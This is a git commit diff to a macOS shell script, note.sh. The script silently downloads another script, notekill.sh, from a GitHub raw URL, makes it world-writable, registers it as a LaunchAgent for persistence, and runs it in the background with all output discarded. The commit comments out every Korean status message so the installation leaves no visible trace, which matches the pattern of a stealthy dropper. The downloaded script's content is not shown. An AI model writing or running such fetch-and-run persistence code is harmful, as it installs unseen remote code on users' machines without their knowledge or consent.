dd5488226d6afc0a649441c03c0dc57b57c33b14
lamonlemon <138787248+lamonlemon@users.noreply.github.com>
2025-04-08 15:15:00 +0530

    Update note.sh

--- note.sh
+++ note.sh
@@ -4,11 +4,11 @@ TARGET_DIR="$HOME"
 PLIST_PATH="$HOME/Library/LaunchAgents/com.user.notekill.plist"
 GITHUB_RAW="https://raw.githubusercontent.com/lamonlemon/n/refs/heads/main/notetest.sh"
 
-echo "[+] notekill.sh 다운로드"
+# echo "[+] notekill.sh 다운로드"
 curl -s -o "$TARGET_DIR/notekill.sh" "$GITHUB_RAW"
 chmod 777 "$TARGET_DIR/notekill.sh"
 
-echo "[+] plist 파일 생성"
+# echo "[+] plist 파일 생성"
 mkdir -p "$HOME/Library/LaunchAgents"
 cat > "$PLIST_PATH" <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
@@ -33,14 +33,14 @@ cat > "$PLIST_PATH" <<EOF
 </plist>
 EOF
 
-echo "[+] launchctl 등록"
+# echo "[+] launchctl 등록"
 launchctl unload "$PLIST_PATH" 2>/dev/null
 launchctl load "$PLIST_PATH"
 
-echo "[+] nohup 백그라운드 실행"
+# echo "[+] nohup 백그라운드 실행"
 nohup "$TARGET_DIR/notekill.sh" > /dev/null 2>&1 &
 
-echo "[+] notekill.sh 파일 삭제"
+# echo "[+] notekill.sh 파일 삭제"
 # rm -f "$TARGET_DIR/notekill.sh"
 
-echo "[+] 설치 완료"
+# echo "[+] 설치 완료"
